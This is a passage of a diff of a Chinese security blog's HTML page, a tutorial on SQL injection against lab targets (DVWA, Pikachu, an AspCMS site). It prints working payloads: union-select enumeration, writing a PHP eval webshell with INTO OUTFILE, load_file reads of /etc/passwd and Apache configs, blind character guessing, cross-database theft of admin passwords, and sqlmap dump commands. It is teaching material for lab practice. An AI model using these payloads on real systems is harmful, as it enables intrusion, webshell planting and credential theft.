       <p>我们需要通过 MySQL 语句进一步的进行测试，开始使用 order by ，order by 语句可以对查询结果进行排列，上面的语句中有两列，使用 order by 语句可以按照第一列 first_time 或者第二列 last_name 对结果进行排列。假如我们想根据第三列结果进行排序，因为查询语句中不存在第三列，就会产生报错：</p>
 <p>ERROR 1054 (42S22)：Unknown column ‘3’ in ‘order clause’</p>
@@ -577,22 +577,22 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="3-1-2-使用联合查询来查询当前数据库，用户，版本信息"   >
+        <h3 id="3-1-2-使用联合查询来查询当前数据库，用户，版本信息">
           <a href="#3-1-2-使用联合查询来查询当前数据库，用户，版本信息" class="heading-link"><i class="fas fa-link"></i></a>3.1.2. 使用联合查询来查询当前数据库，用户，版本信息</h3>
       <p>继续构造 union select 语句，来查询正在使用中的用户 user()，数据库 database()，数据库版本 version()，服务器操作系统 @@version_compile_os，用以下语句：</p>
 <p>‘union select user(),database()+–+（–相当于#，注释；+是空格）</p>
 
-        <h3 id="3-1-3-获取表名，字段，值"   >
+        <h3 id="3-1-3-获取表名，字段，值">
           <a href="#3-1-3-获取表名，字段，值" class="heading-link"><i class="fas fa-link"></i></a>3.1.3. 获取表名，字段，值</h3>
       <p>前面说过 MySQL5.0 以上，information_schema 存储所有数据库下的表名和列名信息，下面我们就来查询 information_schema 数据库名下的表名 tables 的信息（条件：table_schema=0x64767761 dvwa的十六进制）</p>
 <p>information_schema.tables：information_schema 数据库名下表名 tables 记录所有数据库名下的所有表名信息。</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;" >http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761+–+&amp;Submit=Submit</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;">http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761+–+&amp;Submit=Submit</p>
 
-        <h3 id="3-1-4-MySQL-root-用户密码存储位置"   >
+        <h3 id="3-1-4-MySQL-root-用户密码存储位置">
           <a href="#3-1-4-MySQL-root-用户密码存储位置" class="heading-link"><i class="fas fa-link"></i></a>3.1.4. MySQL root 用户密码存储位置</h3>
       <p>数据库最高权限是 root 密码保存在 MySQL 数据库 user 表里，密码是采用 MySQL5.0 特有的加密，通过 cmd5 网站进行解密或通过 cain 这类专业可以对 MySQL hash 破解，所以对数据库做安全的时候无论如何不能给网站 root 权限，一定要给一个普通用户权限。</p>
 
-        <h3 id="3-1-5-对服务器文件进行读写操作（前提条件）"   >
+        <h3 id="3-1-5-对服务器文件进行读写操作（前提条件）">
           <a href="#3-1-5-对服务器文件进行读写操作（前提条件）" class="heading-link"><i class="fas fa-link"></i></a>3.1.5. 对服务器文件进行读写操作（前提条件）</h3>
       <ol>
 <li><p>使用 into outfile 需要有以下条件：</p>
@@ -630,7 +630,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="3-1-6-怎么获取-Web-路径"   >
+        <h3 id="3-1-6-怎么获取-Web-路径">
           <a href="#3-1-6-怎么获取-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.1.6. 怎么获取 Web 路径</h3>
       <p>不管是 root 权限还是普通用户权限要对服务器进行读写我们需要网站路径才能得到 webshell.</p>
 <ol>
@@ -649,28 +649,28 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="3-1-7-利用-SQL-注入写入-webshell"   >
+        <h3 id="3-1-7-利用-SQL-注入写入-webshell">
           <a href="#3-1-7-利用-SQL-注入写入-webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1.7. 利用 SQL 注入写入 webshell</h3>
       <p>假设我们通过 phpinfo 文件知道了网站的物理地址，接下来我们通过使用 union select 语句写入 webshell ，写入需要你有写入的权限。</p>
 <p>‘union select 1,’ ‘INTO OUTFILE ‘/var/www/dvwa/cmd.php’+–+   这种反斜杠/本地没测试，大家测试一下，推荐大家用两个反 <code>\\</code> ，例如：</p>
 <p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39; union select &quot;&lt;?php @eval($_POST[&#39;chopper];?&gt;&quot;,2 into outfile&quot;c:\\php\\htdocs\\dvwa\\123.php&quot;+--+&amp;Submit=Submit</code></p>
 
-        <h2 id="3-2-MySQL-获取-web-路径方法总结"   >
+        <h2 id="3-2-MySQL-获取-web-路径方法总结">
           <a href="#3-2-MySQL-获取-web-路径方法总结" class="heading-link"><i class="fas fa-link"></i></a>3.2. MySQL 获取 web 路径方法总结</h2>
       <p>在 MySQL 注入中，利用 load_file()函数读取网页文件源代码时，首先需要获取网站的路径。网站路径可以通过以下几种方法获得。</p>
 
-        <h3 id="3-2-1-直接在出错信息中显示-Web-路径"   >
+        <h3 id="3-2-1-直接在出错信息中显示-Web-路径">
           <a href="#3-2-1-直接在出错信息中显示-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.1. 直接在出错信息中显示 Web 路径</h3>
       <p>在注入点处加单引号，或者修改提交变量类型，让查询语句出错，从出错信息中往往可以爆出网站 Web 物理路径</p>
 
-        <h3 id="3-2-2-load-file-char-47-列出-freebsd-目录"   >
+        <h3 id="3-2-2-load-file-char-47-列出-freebsd-目录">
           <a href="#3-2-2-load-file-char-47-列出-freebsd-目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.2. load_file(char(47)) 列出 freebsd 目录</h3>
       <p>由于 load_file()函数相当于 Linux 系统中的 cat() 函数，在某些 FreeBSD，Sunos 系统中用 “ cat/ “ 命令可以列出根目录。字符 “ / “ 的 ASCII 码是47 ，在 SQL 注入中，可利用 load_file(char(47)) 直接列出 FreeBSD 等 Linux 系统的文件夹目录。</p>
 
-        <h3 id="3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录"   >
+        <h3 id="3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录">
           <a href="#3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.3. Linux 的 “/etc/passwd” 文件中的工作目录</h3>
       
-        <h3 id="3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径"   >
+        <h3 id="3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径">
           <a href="#3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.4. 读取 apache 的配置文件 “httpd.conf” ，获取 web 路径</h3>
       <p>PHP 网站程序通常都是通过 apache 提供服务的，apache 的配置文件 “httpd.conf” 中包含了网站物理路径，可通过读取该文件获得 Web 路径。</p>
 <p>在 Linux 系统中，可以利用 load_file() 尝试读取以下路径查看 “apache” 配置文件：</p>
@@ -698,7 +698,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </ol>
 <p>也可将C盘换成 D,E,F 盘进行尝试。</p>
 
-        <h3 id="3-2-5-利用-load-file-读取各种配置文件"   >
+        <h3 id="3-2-5-利用-load-file-读取各种配置文件">
           <a href="#3-2-5-利用-load-file-读取各种配置文件" class="heading-link"><i class="fas fa-link"></i></a>3.2.5. 利用 load_file() 读取各种配置文件</h3>
       <p>在 MySQL 注入中，load_file() 函数除了用于读取网页脚本程序源代码外，我们还可以用来读取其他各种敏感的配置文件，方便获得 WebShell 或进行提权。</p>
 <ol>
@@ -741,15 +741,15 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h1 id="二，Access-数据库注入攻击基本技术"   >
+        <h1 id="二，Access-数据库注入攻击基本技术">
           <a href="#二，Access-数据库注入攻击基本技术" class="heading-link"><i class="fas fa-link"></i></a>二，Access 数据库注入攻击基本技术</h1>
       <p>Access 注入攻击针对于那些小网站搭建的，访问流量小的。</p>
 
-        <h2 id="4-1-爆出数据库类型"   >
+        <h2 id="4-1-爆出数据库类型">
           <a href="#4-1-爆出数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1 .爆出数据库类型</h2>
       <p>SQL server 有一些系统变量和系统表，如果服务器 IIS 提示没有关闭，并且 SQL server 返回错误提示的话，可以直接从出错信息中获取判断数据库的类型（后面会详细讲解如何突破 IIS 提示被关闭）</p>
 
-        <h3 id="4-1-1-内置变量爆数据库类型"   >
+        <h3 id="4-1-1-内置变量爆数据库类型">
           <a href="#4-1-1-内置变量爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.1. 内置变量爆数据库类型</h3>
       <p>‘User’ 是 SQL server 的一个内置变量，它的值是当前连接的用户名，其变量类型为 “nvarchar” 字符型，通过提交查询该变量，根据返回的错误信息即可得知数据库类型，方法是在注入点之后提交如下语句：</p>
 <p>and user&gt;0</p>
@@ -761,7 +761,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>则可以判断时 MS SQL 数据库。如果采取的是 Access 数据库的话，那么提示信息则会如下显示：</p>
 <p>Server Error in ‘/‘ Application    在将 nvarchar 值 转换成数据类型 int 时失败</p>
 
-        <h3 id="4-1-2-内置数据表爆数据库类型"   >
+        <h3 id="4-1-2-内置数据表爆数据库类型">
           <a href="#4-1-2-内置数据表爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.2. 内置数据表爆数据库类型</h3>
       <p>如果服务器 IIS 不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点提交如下查询语句：</p>
 <p>and (select count(*) from sysobjects)&gt;=0</p>
@@ -775,14 +775,14 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>系统表 ‘O’ 无效            #存在系统表 [sysobjects]</p>
 <p>系统表 ‘msysobjects’ 无效                 #不存在[msysobjects]</p>
 
-        <h2 id="4-2-猜测数据库名"   >
+        <h2 id="4-2-猜测数据库名">
           <a href="#4-2-猜测数据库名" class="heading-link"><i class="fas fa-link"></i></a>4.2.猜测数据库名</h2>
       <p>可在注入点后提交如下语句进行查询：</p>
 <p>and exists(select * from 数据库表名)       或者</p>
 <p>and (select count(*) from 数据库表名)&gt;=0</p>
 <p>上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更替其他常见数据库表名继续进行查询，</p>
 
-        <h2 id="4-3-猜测字段名及字段长度"   >
+        <h2 id="4-3-猜测字段名及字段长度">
           <a href="#4-3-猜测字段名及字段长度" class="heading-link"><i class="fas fa-link"></i></a>4.3. 猜测字段名及字段长度</h2>
       <p>可在注入点提交如下语句查询：</p>
 <p>and exists(select 字段名 from 数据库表名)     或者</p>
@@ -796,7 +796,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>and (select top 1 len(字段名) from 数据库表名)&gt;n</p>
 <p>当提交 &gt;n-1 时正常，而提交到 n 时返回错误，那么说明字段长度为 n。</p>
 
-        <h3 id="4-1-4-猜字段值"   >
+        <h3 id="4-1-4-猜字段值">
           <a href="#4-1-4-猜字段值" class="heading-link"><i class="fas fa-link"></i></a>4.1.4. 猜字段值</h3>
       <p>猜字段的 ASCII 值，可在注入点后提交如下查询语句：</p>
 <p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;0</p>
@@ -807,11 +807,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>and (select top 1 asc(mid(字段名,2,1)) from 数据库表名)&gt;0</p>
 <p>用上面同样的方法，可以得到第二位字符。在继续进行查询，直接猜解出字段的所有字符值为止。</p>
 
-        <h2 id="4-4-SQL-注入的高级查询"   >
+        <h2 id="4-4-SQL-注入的高级查询">
           <a href="#4-4-SQL-注入的高级查询" class="heading-link"><i class="fas fa-link"></i></a>4.4. SQL 注入的高级查询</h2>
       <p>在上一节介绍的 ASCII 码猜解法很浪费时间，下面介绍一种高效的方法 order by 与 union select 联合查询，可以快速地获取字段长度和字段内容。这种查询方法，不仅可以利用在 Access 数据库猜解中，必须掌握的方法。同样可以适用于利用在其他类型的数据库的注入猜解中。</p>
 
-        <h3 id="4-4-1-order-by-猜字段数目"   >
+        <h3 id="4-4-1-order-by-猜字段数目">
           <a href="#4-4-1-order-by-猜字段数目" class="heading-link"><i class="fas fa-link"></i></a>4.4.1. order by 猜字段数目</h3>
       <p>首先，利用 order by 猜解字段数目，查询语句如下：</p>
 <p>order by 1</p>
@@ -821,7 +821,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>order by n</p>
 <p>如果 n-1 时返回正常，n 时返回错误，那么说明数据库字段数目为 n-1。</p>
 
-        <h3 id="4-4-2-union-select-爆字段内容"   >
+        <h3 id="4-4-2-union-select-爆字段内容">
           <a href="#4-4-2-union-select-爆字段内容" class="heading-link"><i class="fas fa-link"></i></a>4.4.2. union select 爆字段内容</h3>
       <p>得到字段长度后，就可以利用 union select 查询获得字段内容了。</p>
 <p>and 1=2 union select 1,2,3…,n from 表名</p>
@@ -829,28 +829,28 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>and 1=2 union select 1,字段1,字段2…,n from 表名</p>
 <p>在页面中就会返回字段内容，不必一个个进行猜解了。</p>
 
-        <h2 id="5-1-偏移注入"   >
+        <h2 id="5-1-偏移注入">
           <a href="#5-1-偏移注入" class="heading-link"><i class="fas fa-link"></i></a>5.1. 偏移注入</h2>
       <p>偏移注入是针对 Access 数据库，当我们注入猜到数据库表名却猜不到列名 (字段名) 的情况下，这种方法就可以帮我填补。（注：这种方法运气很重要）</p>
 
-        <h2 id="5-2-跨库注入"   >
+        <h2 id="5-2-跨库注入">
           <a href="#5-2-跨库注入" class="heading-link"><i class="fas fa-link"></i></a>5.2. 跨库注入</h2>
       <p>假设 a 和 b 两个站点在同一台服务器上，但是服务器上面安装了 安全狗，waf 这样的安全软件，现在我们要对 a 站点进行攻击，但是没有发现什么大漏洞，只找到网站数据库路径，对数据库下载发现下载不了。这个时候我发现 b 站点有注入点。直接用：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.133.133:83/new_view.asp?id=14" >http://192.168.133.133:83/new_view.asp?id=14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,adminpassword,username,4,5,6,7 from [C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admins</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.133:83/new_view.asp?id=14">http://192.168.133.133:83/new_view.asp?id=14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,adminpassword,username,4,5,6,7 from [C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admins</p>
 <p>[C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admin 是 b 站点的数据库路径</p>
 
-        <h1 id="三，注入之伪静态突破"   >
+        <h1 id="三，注入之伪静态突破">
           <a href="#三，注入之伪静态突破" class="heading-link"><i class="fas fa-link"></i></a>三，注入之伪静态突破</h1>
       <p>phpstudy 配置伪静态</p>
 
-        <h1 id="四，sqlmap-自动化注入"   >
+        <h1 id="四，sqlmap-自动化注入">
           <a href="#四，sqlmap-自动化注入" class="heading-link"><i class="fas fa-link"></i></a>四，sqlmap 自动化注入</h1>
       
-        <h2 id="6-1-sqlmap-基本命令"   >
+        <h2 id="6-1-sqlmap-基本命令">
           <a href="#6-1-sqlmap-基本命令" class="heading-link"><i class="fas fa-link"></i></a>6.1. sqlmap 基本命令</h2>
       <p>#-u 目标网址<br>#–batch 自动化<br>#–dbs数据库<br>#–users 获取所有用户<br>#–current-db  当前数据库<br>#–current-user  当前用户<br>#-D 库名 –tables  指定库下面的表信息<br>#-T 表名 –columns 指定表下面的列信息(前面要有指定的库）<br>#-C 列名 指定列名下的数据<br>#–dump 把想要的down下来（在想要的库或表的后面添加的语句）</p>
-<p>sqlmap.py -u “<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;" >http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch –dbs –level 2</p>
-<p>sqlmap.py -u “<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;" >http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch -D dvwa –tables</p>
+<p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch –dbs –level 2</p>
+<p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch -D dvwa –tables</p>
 <p>……</p>
 </div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://sculptor-liu.github.io">Sculptor</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/">https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/SQL/">SQL</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><div class="post-reward reward"><div class="reward-button">请我喝杯咖啡~</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/images/ali_pay.png"><div class="reward-qrcode-alipay__text">支付宝打赏</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/images/wechat_pay.png"><div class="reward-qrcode-wechat__text">微信打赏</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/07/31/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A6%81/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">逆向基础概要</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/07/25/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B1%BB%20Burpsuite/"><span class="paginator-prev__text">漏洞扫描类 Burpsuite</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="gitalk-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-%E5%85%A5%E4%BE%B5%E5%85%88%E9%81%A3%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2"><span class="toc-number">1.</span> <span class="toc-text">
           Web 入侵先遣——SQL注入攻击技术初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">
@@ -914,7 +914,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
           5.2. 跨库注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%EF%BC%8C%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BC%AA%E9%9D%99%E6%80%81%E7%AA%81%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">
           三，注入之伪静态突破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8Csqlmap-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">
           四，sqlmap 自动化注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-sqlmap-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">
-          6.1. sqlmap 基本命令</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Sculptor</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Sculptor-liu/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://blog.csdn.net/weixin_45798017" target="_blank" rel="noopener" data-popover="social.csdn" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">csdn</span></a></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-email"><a class="sidebar-ov-feed-email__link" href="https://mail.qq.com/" target="_blank" rel="noopener"><span class="sidebar-ov-feed-email__icon"><i class="fas fa-envelope"></i></span><span>Email 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sculptor</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+          6.1. sqlmap 基本命令</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Sculptor</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Sculptor-liu/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://blog.csdn.net/weixin_45798017" target="_blank" rel="noopener" data-popover="social.csdn" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">csdn</span></a></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-email"><a class="sidebar-ov-feed-email__link" href="https://mail.qq.com/" target="_blank" rel="noopener"><span class="sidebar-ov-feed-email__icon"><i class="fas fa-envelope"></i></span><span>Email 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sculptor</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.xml';
 
